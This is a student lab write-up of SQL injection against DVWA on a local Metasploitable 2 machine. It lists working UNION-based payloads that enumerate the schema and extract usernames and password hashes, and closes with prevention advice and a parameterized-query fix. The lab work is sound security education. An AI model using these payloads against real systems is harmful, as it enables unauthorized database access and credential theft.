# Task 3 – SQL Injection on DVWA (Low Security)

## Objective

Demonstrate a classic SQL Injection vulnerability using **DVWA (Damn Vulnerable Web Application)** running on **Metasploitable 2** in a controlled local lab environment. The objective is to understand how SQL Injection works, observe its impact, and explain how developers can prevent it.

> **Ethics Note:** All testing was performed only on my local Metasploitable 2 virtual machine. No real websites or external systems were targeted.

---

# Lab Environment

| Component | Details |
|-----------|---------|
| Host OS | Windows |
| Virtualization | VirtualBox |
| Vulnerable VM | Metasploitable 2 |
| Web Application | DVWA |
| DVWA Security | Low |
| Browser | Chrome |
| Burp Suite | Optional |

> **Note:** Instead of installing DVWA using XAMPP, I used the pre-installed DVWA available inside **Metasploitable 2**.

---

# Setup

1. Started the Metasploitable 2 virtual machine.
2. Confirmed the VM was accessible from the browser.
3. Opened the DVWA application.
4. Logged into DVWA.
5. Set the security level to **Low**.
6. Opened the **SQL Injection** module.

---

# Payload Demonstration

## Payload 1 – Authentication Bypass

**Payload**

```sql
' OR 1 = 1# 
```

**Purpose**

Tests whether the application directly injects user input into an SQL query.

**Result**

Returned multiple records, confirming the vulnerability.

**Screenshots**

- `screenshots/01-payload-1-output.png`

---

## Payload 2 – Database Enumeration

**Payload**

```sql
1)' UNION SELECT database(),null #
2)' UNION SELECT database(),user() #

```

**Purpose**

Retrieves the current database name and database user.

**Result**

Successfully displayed database information.

**Screenshots**

- `screenshots/02-database_name-output.png`

---

## Payload 3 – Table Enumeration

**Payload**

```sql
1) ' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema="dvwa" #
2) ' UNION SELECT table_name,table_name FROM information_schema.tables WHERE table_schema="dvwa" #
```

**Purpose**

Enumerates the available tables in the current database.

**Result**

Displayed the table names.

**Screenshots**

- `screenshots/03-table_name-output.png`

---

## Payload 4 – Column Enumeration

**Payload**

```sql
1)' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'#
2)' UNION SELECT column_name,column_name FROM information_schema.columns WHERE table_name='users'#
```

**Purpose**

Lists the columns inside the `users` table.

**Result**

Displayed the available column names.

**Screenshots**

- `screenshots/04-column_name-output.png`

---

## Payload 5 – Retrieve User Data

**Payload**

```sql
' UNION SELECT user,password FROM users #
```

**Purpose**

Demonstrates how SQL Injection can expose stored user information.

**Result**

Displayed user records and password hashes stored in the DVWA database.

**Screenshots**

- `screenshots/05-user-data-output.png`

---

# How SQL Injection Works

The application builds an SQL query using user input.

Example:

```sql
SELECT first_name, last_name
FROM users
WHERE id='$id';
```

If user input is inserted without proper validation or parameterized queries, the query logic can be altered, allowing unauthorized access to database information.

---

# Security Impact

- Authentication bypass
- Database information disclosure
- Table enumeration
- Column enumeration
- Sensitive data exposure

---

# Prevention

- Use **Prepared Statements (Parameterized Queries)**.
- Validate and sanitize user input.
- Apply least-privilege database permissions.
- Hide database error messages.
- Keep secure application configurations enabled.

---

# Screenshots Included

| Screenshot | Description |
|------------|-------------|
| `01-payload-1-output.png` | Payload 1 result |
| `02-database_name-output.png` | Database enumeration result |
| `03-table_name-output.png` | Table enumeration result |
| `04-column_name-output.png` | Column enumeration result |
| `05-user-data-output.png` | User data result |

---

# How a developer would fix this vulnerability:

Validate all user input using allowlisting.

Accept only expected formats (e.g., numeric IDs only).

Reject invalid or unexpected characters before executing database queries.

example:

Vulnerable Approach (String Formatting):

 username = input("Enter username: ")
 cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

Safe Approach (Parameterized Query):

 username = input("Enter username: ")
 cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
 result = cursor.fetchone()

# Conclusion

This task successfully demonstrated SQL Injection in a **Metasploitable 2 DVWA** lab environment. Using the pre-installed DVWA inside Metasploitable 2 provided a realistic vulnerable-machine setup for understanding SQL Injection while keeping all testing within an isolated local environment.